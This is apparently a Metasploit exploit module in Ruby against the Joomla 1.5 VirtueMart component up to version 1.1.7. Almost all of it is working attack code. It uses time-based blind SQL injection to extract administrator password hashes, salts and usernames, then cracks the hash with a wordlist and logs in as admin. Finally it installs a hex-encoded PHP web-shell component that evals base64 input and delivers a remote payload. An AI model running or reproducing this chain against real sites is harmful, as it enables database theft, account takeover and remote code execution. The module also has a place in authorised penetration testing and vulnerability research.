# Exploit Title: Joomla 1.5 com_virtuemart <= 1.1.7 blind time-based sql injection MSF module
# Date: Thu Jul 28, 2011
# Author: TecR0c - tecr0c.mythsec [@] gmail.com
# Version: <= 1.1.7
# Download: http://dev.virtuemart.net/projects/virtuemart/files
# Greetz: mythsec team, James Bercega for code base for sqli blind


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Exploit::Remote::HttpClient
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Joomla 1.5 VirtueMart Component <= 1.1.7 Blind SQL Injection',
			'Description'    => %q{
			A vulnerability was discovered by Rocco Calvi and Steve Seeley which identifies
			unauthenticated time-based blind SQL injection in the "page" variable of the 
			virtuemart component. This vulnerability allows an attacker to gain information
			from the database with specially crafted URLs taking advantage of the MySQL
			benchmark. This issue was patched in version 1.1.7a.
			},
			'Author'         =>
				[
					'TecR0c',  #Initial discovery, msf module
					'mr_me',  #Initial discovery with TecR0c
				],
			'License'        =>  MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/17132/' ],
					[ 'URL','http://www.stratsec.net/Research/Advisories/' ],
				],
			'Privileged'     =>  false,
			'Platform'       => 'php',
			'Arch'           =>  ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Feb 11 2011',
			'DefaultTarget'  => 0 ))
			
			register_options(
				[
					OptString.new('JDIR', [true, 'Joomla directory', '/']),
					OptInt.new('BMCT', [true, 'Benchmark Counter', 50000000 ]),
					OptInt.new('BMDF', [true, 'Benchmark Difference', 3 ]),
					OptInt.new('BMRC', [true, 'Benchmark Request Count', 1 ]),
					OptString.new('WLIST', [true, 
								'Wordlist location',
						 		'/home/foo/bar.txt' 
								]),
					OptString.new('AGNT', [false, 'User Agent Info', 'Mozilla/5.0' ]),
					OptString.new('PREF', [false, 'Database prefixt', 'jos_' ]),
					OptString.new('JQRY', [false, 
								'URI to trigger bug', 
								'index.php?option=com_virtuemart&page=1' 
								])
				], self.class)
	end
	#################################################
	# Extract "Set-Cookie"
	def init_cookie(data, cstr = true)
	
		# Raw request? Or cookie data specifically?
		data = data.headers['Set-Cookie'] ? data.headers['Set-Cookie']: data
		
		# Beginning
		if ( data )
			
			# Break them apart
			data = data.split(', ')
			
			# Initialize
			ctmp = ''
			tmps = {}
			
			# Parse cookies
			data.each do | x |
			
				# Remove extra data
				x = x.split(';')[0]
				
				# Seperate cookie pairs
				if ( x =~ /([^;\s]+)=([^;\s]+)/im )
					
					# Key
					k = $1
					
					# Val
					v = $2
					
					# Valid cookie value?
					if ( v.length() > 0 )
					
						# Build cookie hash
						tmps[k] = v
						
						# Report cookie status
						print_status("Got Cookie: #{k} => #{v}");
					end
				end
			end
			
			# Build string data
			if ( cstr == true )
				
				# Loop
				tmps.each do |x,y|
					
					# Cookie key/value
					ctmp << "#{x}=#{y};"
				end
				
				# Assign
				tmps['cstr'] = ctmp
			end
			
			# Return
			return tmps
		else
			# Something may be wrong
			init_debug("No cookies within the given response")
		end
	end
	
	#################################################
	
	# Simple debugging output
	def init_debug(resp, exit = 0)
	
		# Continue execution
		if ( exit.to_i > 0 )
		
			# Exit
			exit(0)
		end
		
	end
	
	#################################################
	
	# Generic post wrapper
	def http_post(url, data, headers = {}, timeout = 15)
	
		# Protocol
		proto = datastore['SSL'] ? 'https': 'http'
		
		# Determine request url
		url = url.length ? url: ''
		
		# Determine User-Agent
		headers['User-Agent'] = headers['User-Agent']  ?
		headers['User-Agent'] : datastore['AGNT']
		
		# Determine Content-Type
		headers['Content-Type'] = headers['Content-Type'] ?
		headers['Content-Type'] : "application/x-www-form-urlencoded"
		
		# Determine Content-Length
		headers['Content-Length'] = data.length
		
		# Determine Referer
		headers['Referer'] = headers['Referer']        ?
		headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"
		
		# Delete all the null headers
		headers.each do | hkey, hval |
			
			# Null value
			if ( !hval )
			
				# Delete header key
				headers.delete(hkey)
			end
		end
		
		# Send request
		resp = send_request_raw(
		{
			'uri'     => datastore['JDIR'] + url,
			'method'  => 'POST',
			'data'    => data,
			'headers' => headers
		},
		timeout	)
			
			
		# Returned
		return resp
	
	end
	
	#################################################
	
	# Generic post multipart wrapper
	def http_post_multipart(url, data, headers = {}, timeout = 15)
		
		# Boundary string
		bndr =  Rex::Text.rand_text_alphanumeric(8)
		
		# Protocol
		proto = datastore['SSL'] ? 'https': 'http'
	
		# Determine request url
		url = url.length ? url: ''
		
		# Determine User-Agent
		headers['User-Agent'] = headers['User-Agent']  ?
		headers['User-Agent'] : datastore['AGNT']
		
		# Determine Content-Type
		headers['Content-Type'] = headers['Content-Type'] ?
		headers['Content-Type'] : "multipart/form-data; boundary=#{bndr}"
		
		# Determine Referer
		headers['Referer'] = headers['Referer']        ?
		headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"
		
		# Delete all the null headers
		headers.each do | hkey, hval |
		
			# Null value
			if ( !hval )
			
				# Delete header key
				headers.delete(hkey)
			end
		end
		
		# Init
		temp = ''
		
		# Parse form values
		data.each do |name, value|
		
			# Hash means file data
			if ( value.is_a?(Hash) )
				
				# Validate form fields
				filename = value['filename'] ? value['filename']:
						 init_debug("Filename value missing from #{name}", 1)
				contents = value['contents'] ? value['contents']:
						 init_debug("Contents value missing from #{name}", 1)
				mimetype = value['mimetype'] ? value['mimetype']:
						 init_debug("Mimetype value missing from #{name}", 1)
				encoding = value['encoding'] ? value['encoding']: "Binary"
				
				# Build multipart data
				temp << "--#{bndr}\r\n"
				temp << "Content-Disposition: form-data; name=\"#{name}\"
					; filename=\"#{filename}\"\r\n"
				temp << "Content-Type: #{mimetype}\r\n"
				temp << "Content-Transfer-Encoding: #{encoding}\r\n"
				temp << "\r\n"
				temp << "#{contents}\r\n"
				
			else
				# Build multipart data
				temp << "--#{bndr}\r\n"
				temp << "Content-Disposition: form-data; name=\"#{name}\";\r\n"
				temp << "\r\n"
				temp << "#{value}\r\n"
			end
		end
		
		# Complete the form data
		temp << "--#{bndr}--\r\n"
		
		# Assigned
		data = temp
		
		# Determine Content-Length
		headers['Content-Length'] = data.length
		
		# Send request
		resp = send_request_raw(
		{
			'uri'     => datastore['JDIR'] + url,
			'method'  => 'POST',
			'data'    => data,
			'headers' => headers
		}, 
		timeout)
		
		# Returned
		return resp
		
	end
	
	#################################################
	
	# Generic get wrapper
	def http_get(url, headers = {}, timeout = 15)
		
		# Protocol
		proto = datastore['SSL'] ? 'https': 'http'
		
		# Determine request url
		url = url.length ? url: ''
		
		# Determine User-Agent
		headers['User-Agent'] = headers['User-Agent']  ?
		headers['User-Agent'] : datastore['AGNT']
		
		# Determine Referer
		headers['Referer'] = headers['Referer']        ? 
		headers['Referer'] : "#{proto}://#{datastore['RHOST']}#{datastore['JDIR']}"
		
		# Delete all the null headers
		headers.each do | hkey, hval |
		
			# Null value // Also, remove post specific data, due to a bug ...
			if ( !hval || hkey == "Content-Type" || hkey == "Content-Length" )
			
				# Delete header key
				headers.delete(hkey)
			end
		end
		
		
		# Send request
		resp = send_request_raw({
			'uri'     => datastore['JDIR'] + url,
			'headers' => headers,
			'method'  => 'GET',
		}, timeout)
		
		# Returned
		return resp
		
	end
	
	#################################################
	
	
	# Used to perform benchmark querys
	def sql_benchmark(test, hdrs, table = nil, where = '1+LIMIT+1', tnum = nil ) 
	
		# Init
		wait = 0
		
		# Defaults
		table = table ? table: 'users'
		
		# SQL Injection string used to trigger the MySQL BECNHMARK() function
		sqli = ("'+UNION+SELECT+IF(#{test},+BENCHMARK(#{datastore['BMCT']},\
+MD5(1)),+0)+FROM+#{datastore['PREF']}#{table}+WHERE+#{where}--+sqli.page")
		
		# Number of tests to run. We run this
		# amount of tests and then look for a
		# median value that is greater than
		# the benchmark difference.
		tnum = tnum ? tnum: datastore['BMRC']
		
		# Run the tests
		tnum.to_i.times do | i |
		
			# Start time
			bmc1 = Time.now.to_i
			
			# Make the request
			
			
			init_debug(http_get("#{datastore['JQRY']}#{sqli}", hdrs))
			# End time
			bmc2 = Time.now.to_i
			
			
			# Total time
			wait += bmc2 - bmc1
		end
		
		# Return the results
		return ( wait.to_i / tnum.to_i )
		
	end
	
	
	#################################################
	
	
	# Used to perform benchmark querys
	def sql_benchmark_2(hdrs, columns = nil, table = nil, where = '1+LIMIT+1', tnum = nil )
	
		# Init
		wait = 0
		
		# Defaults
		table = table ? table: 'users'
		
		# SQL Injection string used to trigger the MySQL BECNHMARK() function
		sqli = (
"'+UNION+SELECT+IF(substring((select+#{columns}+FROM+#{datastore['PREF']}#{table}+WHERE+#{where}),1,1),BENCHMARK(#{datastore['BMCT']},+MD5(1)),+0)--+sqli.page")
		
		# Number of tests to run. We run this
		# amount of tests and then look for a
		# median value that is greater than
		# the benchmark difference.
		tnum = tnum ? tnum: datastore['BMRC']
		
		# Run the tests
		tnum.to_i.times do | i |
		
			# Start time
			bmc1 = Time.now.to_i
			
			# Make the request
			
			
			init_debug(http_get("#{datastore['JQRY']}#{sqli}", hdrs))
			# End time
			bmc2 = Time.now.to_i
			
			
			# Total time
			wait += bmc2 - bmc1
		end
		
		# Return the results
		return ( wait.to_i / tnum.to_i )
		
	end
	
	
	#################################################
	
	
	def get_password(hash, salt, opts = nil)
	
		# Wordlist
		wlst = datastore['WLIST']
		
		# Init
		cntr = 0
			
		# Verbose
		print_status("Attempting to crack admin password hash")
		
		# Valid hash length only
		if ( hash.length != 32 )
		
			# Failure
			print_error("Invalid Joomla MD5 hash: #{hash.to_s}")
			return nil
		end
		
		# Does the wordlist exist?
		if ( !File.exist?(wlst) )
		
			# Failure
			print_error("Unable to load wordlist: #{wlst}")
			return nil
		else
			
			# Load the wordlist file
			list = File.readlines(wlst)
		end
		
		# Verbose
		print_status("Loaded #{list.count.to_s} words from the specified list")
		print_status("This may take quite some time ...")
		
		# Start time
		bmc1 = Time.now.to_i
		
		# Loop through list
		list.each do | word |
		
			# Cleanup
			word = word.strip
			
			# Counter
			cntr = cntr + 1
			
			# Attempt to find the plaintext password
			if ( hash == Rex::Text.md5(word + salt) )
			
				# Success!
				print_status("Successfully cracked the following hash")
				print_status("#{hash} => #{salt} == #{word}")
				
				# Ended time
				bmc2 = Time.now.to_i
				
				# Duration
				bmc3 = bmc2 - bmc1
				bmc3 = ( bmc3 < 60 ) ? "#{bmc3} seconds": "#{(bmc3/60)} minutes"
				
				# Verbose
				print_status("Operation completed in #{bmc3}")
				
				# Return
				return word
			end # if
		end # each
		
		# Failure
		print_error("Unable to crack the following hash")
		print_error("#{hash} => #{salt} == ???")
		
		# Ended time
		bmc2 = Time.now.to_i
		
		# Duration
		bmc3 = bmc2 - bmc1
		bmc3 = ( bmc3 < 60 ) ? "#{bmc3} seconds": "#{(bmc3/60)} minutes"
		
		# Verbose
		print_status("Operation completed in #{bmc3}")
		
		# Return
		return nil
	end
	
	#################################################
	
	def get_users_data(hdrs, snum, slim, cset, sqlf, sqlw)

			# Start time
			tot1 = Time.now.to_i
			
			# Initialize
			reqc = 0
			retn = String.new
				
			# Extract salt
			for i in snum..slim
			
				# Offset position
				oset = ( i - snum ) + 1
	
				# Loop charset
				for cbit in cset
	
					# Test character
					cbit.each do | cchr |
	
						# Start time (overall)
						bmc1 = Time.now.to_i
	
						# Benchmark query
						bmcv = sql_benchmark("SUBSTRING(#{sqlf},#{i},1)+LIKE+BINARY+CHAR(#{cchr.ord})",
						hdrs,"users", sqlw, datastore['BMRC'])
	
						# Noticable delay? We must have a match! ;)
						if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
	
							# Verbose
							print_status(sprintf("Character %02s is %s", oset.to_s, cchr ))
	
							# Append chr
							retn << cchr
	
							# Exit loop
							break
						end 
	
						# Counter
						reqc += 1
	
					end # each
				end # for
	
				# Host not vulnerable?
				if ( oset != retn.length )
					
					# Failure
					print_error("Unable to extract character ##{oset.to_s}\
					. Extraction failed!")
					return nil
				end
			end # for
	
			# End time (total)
			tot2 = Time.now.to_i
	
			# Benchmark totals
			tot3 = tot2 - tot1
	
			# Verbose
			print_status("Found data: #{retn}")
			print_status("Operation required #{reqc.to_s} requests (#{( tot3 / 60).to_s} minutes)")
			
			# Return
			return retn
	end
	
	#################################################
	
	def check

                print_status("Attempting to determine virtuemart version")

                resp = http_get("modules/mod_virtuemart_currencies/mod_virtuemart_currencies.xml")

                # Extract Joomla version information
                if ( resp.body =~ /<version>([^\s]+)<\/version>/ )

                        # Version
                        vers = $1.strip

                        # Version "parts"
                        ver1, ver2, ver3 = vers.split(/\./)

                        # Only if version 1.1.7
                        if ( ver3.to_i >= 7)

                                # Exploit failed
                                init_debug(resp)
				print_status("Please confirm manually")
				return Exploit::CheckCode::Safe
                        else

                                print_status("The target is running VirtueMart : #{vers}")
				return Exploit::CheckCode::Vulnerable
                        end
                else

                        # Verbose
                        print_error("Unable to determine Joomla version ...")
                end

	end
	
	#################################################
	def exploit
	
		# Numeric test string
		tstr = Time.now.to_i.to_s

		# MD5 test string
		tmd5 = Rex::Text.md5(tstr)
	
		# Encoded payload
		load = payload.encoded
		
		#################################################
		# STEP 02 // Get the cookie for virtuemart :) 
		#################################################

		# request to get virtuemart cookie 
		resp = http_get("index.php?option=com_virtuemart&page=1")

		# Init cookie
		cook = init_cookie(resp)

		# Build headers for authenticated session
		hdrs = { "Cookie" => cook['cstr'] }

		#################################################
		# STEP 03 // Calculate BENCHMARK() response times
		#################################################

		# Verbose
		print_status("Calculating target response times")
		print_status("Benchmarking #{datastore['BMRC']} normal requests")
		

		# Normal request median (globally accessible)
		datastore['BMC0'] = sql_benchmark("1=2", hdrs)
		
		# Verbose
		print_status("Normal request avg: #{datastore['BMC0'].to_s} seconds")
		print_status("Benchmarking #{datastore['BMRC']} delayed requests")

		# Delayed request median
		bmc1 = sql_benchmark("1=1", hdrs)

		# Verbose
		print_status("Delayed request avg: #{bmc1.to_s} seconds")

		# Benchmark totals
		bmct = bmc1 - datastore['BMC0']

		# Delay too small. The host may not be
		# vulnerable. Try increasing the BMCT.
		if ( bmct.to_i < datastore['BMDF'].to_i )

			# Verbose
			print_error("your benchmark threshold is small, or host is not vulnerable")
			print_error("increase the benchmark threshold adjust the value of the BMDF")
			print_error("increase the expression iterator adjust the value of the BMCT")
			return
		else
			# Host appears exploitable
			print_status("Request Difference: #{bmct.to_s} seconds")
		end

		#################################################
		# STEP 04 // Attempting to find a valid admin id
		#################################################
		
		atot = 0     # Total admins
		scnt = 0     # Step counter
		step = 10    # Step increment
		slim = 10000 # Step limit
		
		# 42 is the hard coded base uid within Joomla ...
		# ... and the answer to the ultimate question! ;]
		snum = ( !defined?(auid) ) ? 62: auid # changed from 42 to 62
		
		# Verbose
		print_status("Calculating total number of administrators")
		
		# Check how many admin accounts are in the database
		for i in 0..slim do

			# Benchmark 
			bmcv = sql_benchmark_2(hdrs, "gid", "users", "gid=25+LIMIT+#{i.to_s},1",datastore['BMRC'])
			
			# If we do not have a delay, then we have reached the end ...
			if ( !( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) )

				# Range
				atot = i
				
				# Verbose
				print_status("Successfully confirmed #{atot.to_s} admin accounts")

				# Exit loop
				break
			end 
		end
			
		# Loops until limit
		while ( snum < slim && scnt < atot )
	
			# Verbose
			print_status("Attempting to find a valid admin ID")
			
			# Verbose
			print_status("Stepping from #{snum.to_s} to #{slim.to_s} by #{step.to_s}")
	
			for i in snum.step(slim, step)
				bmcv = 0
				
	
				# Benchmark
				bmcv = sql_benchmark("#{i}+>+id", hdrs, "users","gid=25+LIMIT+#{scnt.to_s},1", datastore['BMRC'])

				# Noticable delay? We must have a match! ;)
				if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
	
					# Range
					itmp = i
	
					# Exit loop
					break
				else
					
					# Out of time ..
					if ( i == slim )
					
						# Failure
						print_error("Unable to find a valid user id. Exploit failed!")
						return
					end
					
				end 
			end
	
			# Jump back by #{step} and increment by one
			for i in ( snum ).upto(( itmp ))
				bmcv = 0
				auid = 0

	
				# Benchmark 
				bmcv = sql_benchmark("id+=+#{i}", hdrs, "users", "gid=25",
				datastore['BMRC'])
	
				# Noticable delay? We must have a match! ;)
				if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
	
					# UserID - first time auid gets set to 62
					auid = i
	
					# Verbose
					print_status("Found a valid admin account uid : #{auid.to_s}")
					
					# Step Counter
					scnt += 1
	
					# Exit loop
					break
				else
					
					# Out of time ..
					if ( i == ( itmp + step ) )
					
						# Failure
						print_error("Unable to find a valid user id. Exploit failed!")
						return
					end
				end 
			end
			
			#################################################
			# These are the charsets used for the enumeration
			# operations and can be easily expanded if needed
			#################################################
	
			# Hash charset a-f0-9
			hdic = [ ('a'..'f'), ('0'..'9') ]
	
			# Salt charset a-zA-Z0-9
			sdic = [ ('a'..'z'), ('A'..'Z'), ('0'..'9') ]
			
			# Username charset
			udic = [ ('a'..'z'), ('A'..'Z'), ('0'..'9') ]
		
			#################################################
			# STEP 05 // Attempt to extract admin pass hash
			#################################################
	
			# Verbose
			print_status("Attempting to gather admin password hash")
			
			# Get pass hash - changed bs
			if ( auid != 0 && !( hash = get_users_data(
							hdrs,             # Pass cookie value
							1,                # Length Start
							32,               # Length Maximum
							hdic,             # Charset Array
							"password",       # SQL Field name
							"id=#{auid.to_s}" # SQL Where data
							) ) )
							
				# Failure
				print_error("Unable to gather admin pass hash. Exploit failed!!")
				return
			end
			#################################################
			# STEP 06 // Attempt to extract admin pass salt
			#################################################
			
			# Verbose
			print_status("Attempting to gather admin password salt")
			
			# Get pass salt - changed bs
			if ( auid != 0 && !( salt = get_users_data(
							hdrs,             # Pass cookie value
							34,               # Length Start
							65,               # Length Maximum
							sdic,             # Charset Array
							"password",       # SQL Field name
							"id=#{auid.to_s}" # SQL Where data
							) ) )
							
				# Failure
				print_error("Unable to gather admin pass salt. Exploit failed!!")
				return
			end

			#################################################
			# STEP 07 // Attempt to crack the extracted hash
			#################################################
	
			# Attempt to crack password hash - changed bs
			if ( auid != 0 )
				pass = get_password(hash, salt)
			end
	
			# Got pass? - changed bs
			if ( auid != 0 && pass )

				#################################################
				# STEP 08 // Attempt to extract admin username
				#################################################
				
				# Verbose
				print_status("Attempting to determine target username length")
				
				# Hard limit is 150
				for i in 1.upto(150)
		
					# Benchmark 
					bmcv = sql_benchmark("LENGTH(username)=#{i.to_s}", hdrs,
					"users", "id=#{auid.to_s}", datastore['BMRC'])
		
					# Noticable delay? We must have a match! ;)
					if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) )
		
						# Length
						ulen = i
						
						# Verbose
						print_status("The username is #{i.to_s} characters long")
		
						# Exit loop
						break
					end 
				end
		
				# Verbose
				print_status('Gathering admin username')
		
				# Get pass salt
				if ( !( user = get_users_data(
								hdrs,            # Pass cookie value
								1,               # Length Start
								ulen,               # Length Maximum
								udic,             # Charset Array
								"username",       # SQL Field name
								"id=#{auid.to_s}" # SQL Where data
								) ) )
								
					# Failure
					print_error("Unable to gather admin user name. Exploit failed!!")
					return
				end

				# Verbose
				print_status("Attempting to extract a valid request token")
				
				# Request a valid token
				resp = http_get("administrator/index.php")
				
				# Extract token
				if ( resp.body =~ /['|"]([a-f0-9]{32})["|']/ )
				
					# Token
					rtok = $1
					
					# Verbose
					print_status("Got token: #{rtok}")
				else
				
					# Failure
					print_error("Unable to extract request token. Exploit failed!")
					init_debug(resp)
					return
				end
				
				# Init cookie
				cook = init_cookie(resp)
				
				# Build headers for authenticated session
				hdrs = { "Cookie" => cook['cstr'] }
				
				#################################################
				# STEP 09 // Attempt to authenticate as the admin
				#################################################
				
				# Verbose
				print_status("Attempting to login as: #{user}")
				
				# Post data for login request
				post = "username=#{user}&passwd=#{pass}\
				?=&option=com_login&task=login&#{rtok}=1"
				
				# Login request
				resp = http_post("administrator/index.php", post, hdrs)
				
				# Authentication successful???
				if ( resp && resp.code == 303 )
				
					# Success
					print_status("Successfully logged in as: #{user}")
				else
				
					# Failure
					print_error("Unable to authenticate. Exploit failed!")
					init_debug(resp)
					return
				end		
				
				#################################################
				# STEP 10 // Upload wrapper and execute payload!
				#################################################
					
				# Verbose
				print_status("Attempting to extract refreshed request token")
				
				# Request a valid token (again)
				resp = http_get("administrator/index.php?option=com_installer",hdrs)
				
				# Extract token
				if ( resp.body =~ /['|"]([a-f0-9]{32})["|']/ )
				
					# Token
					rtok = $1
					
					# Verbose
					print_status("Got token: #{rtok}")
				else
				
					# Failure
					print_error("Unable to extract request token. Exploit failed!")
					init_debug(resp.body)
					return
				end
				
				# Component specific data
				cstr = "joomla"
				czip = "com_#{cstr}.zip"
				curi = "components/com_#{cstr}/#{cstr}.php"

				#################################################
				# Our Joomla specific PHP payload wrapper that is
				# used to have more flexibility when delivering a
				# selected payload to a target. The wrapper is in
				# the Joomla! 1.6 compononent format and can also
				# be used with other Joomla exploits.
				#################################################
				#
				# Type: Joomla 1.6 Component
				# File: com_joomla/joomla.xml <-- installer file
				#       com_joomla/joomla.php <-- component file
				#
				# Data: <?php
				#       # Modify settings
				#       error_reporting(0);
				#       ini_set('max_execution_time', 0);
				#
				#       # Execute the selected payload, and delete the wrapper
				#       @eval(base64_decode(file_get_contents('php://input')));
				# ?>
				#################################################
				
				# Hex encoded component zip data
				wrap  = "\x50\x4B\x03\x04\x0A\x00\x00\x00\x00\x00\x65\xB3\x9A\x3E\x00\x00"
				wrap << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x63\x6F"
				wrap << "\x6D\x5F\x6A\x6F\x6F\x6D\x6C\x61\x2F\x50\x4B\x03\x04\x0A\x00\x00"
				wrap << "\x00\x00\x00\x35\xB2\x9A\x3E\x53\x03\xF2\xF9\xAF\x00\x00\x00\xAF"
				wrap << "\x00\x00\x00\x15\x00\x00\x00\x63\x6F\x6D\x5F\x6A\x6F\x6F\x6D\x6C"
				wrap << "\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61\x2E\x70\x68\x70\x3C\x3F\x70\x68"
				wrap << "\x70\x0D\x0A\x23\x20\x4D\x6F\x64\x69\x66\x79\x20\x73\x65\x74\x74"
				wrap << "\x69\x6E\x67\x73\x0D\x0A\x65\x72\x72\x6F\x72\x5F\x72\x65\x70\x6F"
				wrap << "\x72\x74\x69\x6E\x67\x28\x30\x29\x3B\x0D\x0A\x69\x6E\x69\x5F\x73"
				wrap << "\x65\x74\x28\x27\x6D\x61\x78\x5F\x65\x78\x65\x63\x75\x74\x69\x6F"
				wrap << "\x6E\x5F\x74\x69\x6D\x65\x27\x2C\x20\x30\x29\x3B\x0D\x0A\x0D\x0A"
				wrap << "\x23\x20\x45\x78\x65\x63\x75\x74\x65\x20\x74\x68\x65\x20\x73\x65"
				wrap << "\x6C\x65\x63\x74\x65\x64\x20\x70\x61\x79\x6C\x6F\x61\x64\x0D\x0A"
				wrap << "\x40\x65\x76\x61\x6C\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63"
				wrap << "\x6F\x64\x65\x28\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E"
				wrap << "\x74\x65\x6E\x74\x73\x28\x27\x70\x68\x70\x3A\x2F\x2F\x69\x6E\x70"
				wrap << "\x75\x74\x27\x29\x29\x29\x3B\x0D\x0A\x3F\x3E\x50\x4B\x03\x04\x0A"
				wrap << "\x00\x00\x00\x00\x00\x91\xB6\x9A\x3E\x8D\x4A\x99\xA9\x07\x01\x00"
				wrap << "\x00\x07\x01\x00\x00\x15\x00\x00\x00\x63\x6F\x6D\x5F\x6A\x6F\x6F"
				wrap << "\x6D\x6C\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61\x2E\x78\x6D\x6C\x3C\x3F"
				wrap << "\x78\x6D\x6C\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E\x30"
				wrap << "\x22\x20\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x75\x74\x66\x2D"
				wrap << "\x38\x22\x3F\x3E\x0D\x0A\x3C\x65\x78\x74\x65\x6E\x73\x69\x6F\x6E"
				wrap << "\x20\x74\x79\x70\x65\x3D\x22\x63\x6F\x6D\x70\x6F\x6E\x65\x6E\x74"
				wrap << "\x22\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E\x36\x2E\x30"
				wrap << "\x22\x3E\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x6E\x61"
				wrap << "\x6D\x65\x3E\x4A\x6F\x6F\x6D\x6C\x61\x3C\x2F\x6E\x61\x6D\x65\x3E"
				wrap << "\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x66\x69\x6C\x65\x73"
				wrap << "\x20\x66\x6F\x6C\x64\x65\x72\x3D\x22\x73\x69\x74\x65\x22\x3E\x3C"
				wrap << "\x66\x69\x6C\x65\x6E\x61\x6D\x65\x3E\x6A\x6F\x6F\x6D\x6C\x61\x2E"
				wrap << "\x70\x68\x70\x3C\x2F\x66\x69\x6C\x65\x6E\x61\x6D\x65\x3E\x3C\x2F"
				wrap << "\x66\x69\x6C\x65\x73\x3E\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20"
				wrap << "\x20\x3C\x61\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x74\x69\x6F\x6E"
				wrap << "\x3E\x3C\x6D\x65\x6E\x75\x3E\x4A\x6F\x6F\x6D\x6C\x61\x3C\x2F\x6D"
				wrap << "\x65\x6E\x75\x3E\x3C\x2F\x61\x64\x6D\x69\x6E\x69\x73\x74\x72\x61"
				wrap << "\x74\x69\x6F\x6E\x3E\x0D\x0A\x3C\x2F\x65\x78\x74\x65\x6E\x73\x69"
				wrap << "\x6F\x6E\x3E\x0D\x0A\x50\x4B\x01\x02\x14\x00\x0A\x00\x00\x00\x00"
				wrap << "\x00\x65\xB3\x9A\x3E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
				wrap << "\x00\x0B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
				wrap << "\x00\x00\x00\x63\x6F\x6D\x5F\x6A\x6F\x6F\x6D\x6C\x61\x2F\x50\x4B"
				wrap << "\x01\x02\x14\x00\x0A\x00\x00\x00\x00\x00\x35\xB2\x9A\x3E\x53\x03"
				wrap << "\xF2\xF9\xAF\x00\x00\x00\xAF\x00\x00\x00\x15\x00\x00\x00\x00\x00"
				wrap << "\x00\x00\x00\x00\x20\x00\x00\x00\x29\x00\x00\x00\x63\x6F\x6D\x5F"
				wrap << "\x6A\x6F\x6F\x6D\x6C\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61\x2E\x70\x68"
				wrap << "\x70\x50\x4B\x01\x02\x14\x00\x0A\x00\x00\x00\x00\x00\x91\xB6\x9A"
				wrap << "\x3E\x8D\x4A\x99\xA9\x07\x01\x00\x00\x07\x01\x00\x00\x15\x00\x00"
				wrap << "\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x0B\x01\x00\x00\x63"
				wrap << "\x6F\x6D\x5F\x6A\x6F\x6F\x6D\x6C\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61"
				wrap << "\x2E\x78\x6D\x6C\x50\x4B\x05\x06\x00\x00\x00\x00\x03\x00\x03\x00"
				wrap << "\xBF\x00\x00\x00\x45\x02\x00\x00\x00\x00"

				# Verbose
				print_status("Attempting to upload payload wrapper component")
				
				# Post data
				data = {
				
					# Component data
					'install_package' =>
					{ 
						'filename' =>  czip,
						'contents' =>  wrap,
						'mimetype' => 'application/zip',
						'encoding' => 'binary',
					},
					
					# Required install params
					"installtype"  => "upload",
					"task"         => "install.install",
					"#{rtok}"      => "1",
				}
				
				# Upload the wrapper component
				init_debug(http_post_multipart("administrator/index.php?option=\
				com_installer&view=install", data, hdrs))

				# Deliver the selected payload to the target
				init_debug(http_post(curi, Rex::Text.encode_base64(load)))
				
				# Shell
				handler
				return
			else
			
				# Verbose
				print_error("Failed to crack hash. Searching for new admin account ...")
			end # if
		snum += 1
		end # while
		
		# Verbose
		print_error("Unable to crack any admin hashes. Try a better wordlist?")
		return
	end
end
